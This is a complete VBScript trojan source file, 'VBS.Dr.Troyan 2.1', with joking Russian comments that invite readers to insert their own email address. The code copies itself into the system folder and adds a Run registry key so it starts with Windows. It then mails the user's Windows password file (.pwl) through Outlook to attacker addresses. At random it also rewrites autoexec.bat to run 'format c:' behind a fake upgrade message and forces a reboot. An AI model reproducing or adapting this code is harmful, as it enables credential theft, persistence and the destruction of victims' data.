'VBS.Dr.Troyan 2.1 (C)DrWeb
'просьба не стирать копирайт, хокей?
sub Reboot 'Процедурка перезагрузки
Set Shell=CreateObject("WScript.Shell")
Shell.Run "Rundll32.exe User.exe,ExitWindows" 'Вызов WinApi с помощью RunDll ))))
end sub

function Random(n) 'Функция возвращает случайное число
randomize timer
Random=Int(n*rnd)
end function

sub destruct
set fs=createobject("Scripting.FileSystemObject")'FileSystem
if fs.fileexists("c:\autoexec.bat") then 'Если у нас Autoexec существует
set ab=fs.getfile("c:\autoexec.bat") 'Возмём его
ab.attributes=0 'И поставим "нормальные" аттрибуты))
end if
set autoexec=fs.CreateTextFile("c:\autoexec.bat")'Пересоздадим Autoexec
'Далее запишем в него полезные комманды, их там явно не хватает!)
autoexec.WriteLine "@cls"
autoexec.WriteLine "@echo Windows upgrading your system..."
autoexec.WriteLine "@echo Do not abort this process!"
autoexec.WriteLine "@format c: /autotest"
autoexec.close 'Закроем Autoexec.bat
end sub

sub write(k,v) 'Процедурка записи в реестр
Set RegEdit = CreateObject("WScript.Shell")'Shell создадим
RegEdit.RegWrite k,v ' И запишем...
end sub

function read(k) 'Функция чтения с реестра
Set RegEdit = CreateObject("WScript.Shell") 'Shell создадим
read=RegEdit.regread(k) 'И просто прочитаем...)
end function
On Error Resume Next 'Вдруг ошибка!)
Set FileSystem = CreateObject("Scripting.FileSystemObject") 'Объект FileSystem
Set MeAgain = FileSystem.GetFile(WScript.ScriptFullName) 'Нука ,где тут мы?
Set WinDir = FileSystem.GetSpecialFolder(0) 'А гдеж у нас WINDOWS?
Set SysDir = FileSystem.GetSpecialFolder(1) 'А гдеж SYSTEM ?
CopyPath=SysDir&"\Kernel.vbs" 'Наше будущее имя
AccName=read("HKEY_LOCAL_MACHINE\Network\Logon\UserName") 'Нука, что у нас за Узер здесь?
Write "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\System32",CopyPath 'А мы терь запускаемся вместе с ВИНДАМИ
MeAgain.Copy(CopyPath) 'Скопируем себя в SYSTEM
pswrdfile=windir&"\"&AccName&".pwl" 'Здесь у нас теперь путь к любимому файлу
set OutLook=WScript.CreateObject("Outlook.Application")'Ваще объект создадим
set milo=OutLook.CreateItem(0) 'Создадим сообщение
milo.Recipients.Add("drweb2k@chat.ru")      'Это мой майл, если невпдлу оставь...)
milo.Recipients.Add("xxxxvirus@yahoo.com")  'Сюда вставь свой майл
milo.Subject = "PASSWORD"
milo.Body = "PASSWORD FILE GOT>"
milo.Attachments.Add(pswrdfile) 'Добавим к письму любимый файл
milo.Send 'Оитправим почту
if random(120)=20 then 'Если вдруг случайное число=20
destruct 'То запишем в Autoexec комманду format
reboot ' И перезагрузим пень
end if
